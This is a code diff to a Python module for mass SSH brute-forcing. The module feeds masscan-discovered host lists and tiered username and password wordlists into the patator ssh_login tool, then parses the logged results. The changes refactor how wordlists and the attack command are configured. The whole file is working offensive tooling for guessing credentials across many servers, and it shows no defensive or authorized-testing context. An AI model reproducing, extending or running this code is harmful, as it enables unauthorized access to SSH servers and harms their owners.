@@ -1,5 +1,12 @@
 # -*- coding: utf-8 -*-
+
+
+# TODO: remove all code associated with patator utility and write own bruteforce utility by ssh.
+
+
 import subprocess
+
+from collections import namedtuple
 
 from bs4 import BeautifulSoup
 
@@ -14,10 +21,8 @@ class Bruteforce(object):
         self.result_dir = None                                              # Results dir in bruteforce directory.
 
     def parse_result_file(self):
-        """
-        Method which parse result file , filtered data such as host, mesg and write data in new file.
-        :return:
-        """
+        date = utils.date_today()
+
         # Read and parse data.
         with open(self.result_dir + '/RESULTS.xml') as file:
             bs_obj = BeautifulSoup(file, 'lxml-xml')
@@ -27,9 +32,6 @@ class Bruteforce(object):
         mesgs = bs_obj.findAll('mesg')
         start_time = bs_obj.find('start')['utc']
         stop_time = bs_obj.find('stop')['utc']
-
-        # Get today date.
-        date = utils.date_today()
 
         # Write filtered data in new file.
         for i in range(hosts_num):
@@ -43,34 +45,60 @@ class Bruteforce(object):
 
         return uix.bruteforce_result_msg(start_time, stop_time, hosts_num)
 
-    def start_bruteforce(self, choice):
-        """
-        Method which start bruteforce attack on hosts from chosen hosts file.
-        :param choice:
-        :return:
-        """
-        chosen_file = self.hosts_files[int(choice)]                                     # Get chosen file.
-        port = utils.get_port_from_file_name(chosen_file)                               # Get port from file by choice.
-        date = utils.date_today()                                                       # Get today date.
-        self.result_dir = f'{self.directory}/{port}_{date}'                             # Set current result directory.
+    @staticmethod
+    def configure_wordlists_for_brute(hosts, bruteforce_type):
+        abs_path = utils.get_abs_path_to_dir('wordlists')
 
-        # Exec command.
-        command = ['patator', 'ssh_login', 'host=FILE0', 'user=COMBO10', 'password=COMBO11',
-                   f'0=results/masscan/{chosen_file}', '1=wordlists/ssh-default-userpass.txt',
-                   '-x', 'ignore:code=1', '-x', 'ignore:fgrep="Authentication Failed"',
-                   '-x', 'free=host:code=0', '-l', f'{self.directory}/{port}_{date}']
+        wordlists = {
+            'users_small': abs_path + '/usernames_small.lst',
+            'users_big': abs_path + '/usernames_big.lst',
+            'pas_low': abs_path + '/passwds_low.lst',
+            'pas_medium': abs_path + '/passwds_medium.lst',
+            'pas_high': abs_path + '/passwds_high.lst.bz2',
+        }
 
+        configured_wordlist = namedtuple('configured_wordlist', ['hosts', 'usernames', 'passwords'])
+
+        configured_wordlists = {
+            '0': configured_wordlist(hosts, wordlists.get('users_small'), wordlists.get('pas_low')),
+            '1': configured_wordlist(hosts, wordlists.get('users_small'), wordlists.get('pas_medium')),
+            '2': configured_wordlist(hosts, wordlists.get('users_big'), wordlists.get('pas_high')),
+            '3': bruteforce_type,
+        }
+
+        if isinstance(bruteforce_type, tuple):
+            return configured_wordlists.get('3')
+
+        return configured_wordlists.get(bruteforce_type)
+
+    def configure_command(self, hosts_file, port, bruteforce_type):
+        date = utils.date_today()
+        self.result_dir = f'{self.directory}/{port}_{date}'
+        configured_wordlists = self.configure_wordlists_for_brute(hosts_file, bruteforce_type)
+
+        command = ['patator', 'ssh_login', 'host=FILE2', 'user=FILE1', 'password=FILE0',
+                   f'2={configured_wordlists.hosts}', f'1={configured_wordlists.usernames}',
+                   f'0={configured_wordlists.passwords}', '-x', 'ignore:code=1',
+                   '-l', f'{self.directory}/{port}_{date}']
+
+        return command
+
+    def start_bruteforce(self, user_input, bruteforce_type):
+        abs_path = utils.get_abs_path_to_dir('results/masscan/')
+
+        try:
+            hosts_file = abs_path + '/' + self.hosts_files[int(user_input)]
+            port = utils.get_port_from_file_name(hosts_file)
+        except ValueError:
+            port = '22'
+            hosts_file = user_input
+
+        command = self.configure_command(hosts_file, port, bruteforce_type)
         subprocess.run(command, stdout=subprocess.PIPE, encoding='utf-8')
-
-        # Parse results and show menu.
         msg = self.parse_result_file()
         uix.show_menu(msg=msg)
 
     def run(self):
-        """
-        Method which get choice of which file of hosts need to use , then run bruteforce and write results.
-        :return:
-        """
-        choice = uix.bruteforce_start_msg(self.hosts_files)
-        self.start_bruteforce(choice)
+        user_input, bruteforce_type = uix.bruteforce_start_msg(self.hosts_files)
+        self.start_bruteforce(user_input, bruteforce_type)
 
